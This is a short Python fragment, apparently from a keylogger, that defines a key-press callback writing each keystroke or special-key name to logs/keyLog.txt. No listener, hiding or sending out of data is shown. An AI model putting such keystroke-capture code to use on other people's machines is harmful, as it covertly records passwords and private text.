import time

def onPress(key):
    with open("logs/keyLog.txt", "a") as logFile:
        try:
            logFile.write(f'{key.char}')
        except AttributeError:
            logFile.write(f' [{key}] ')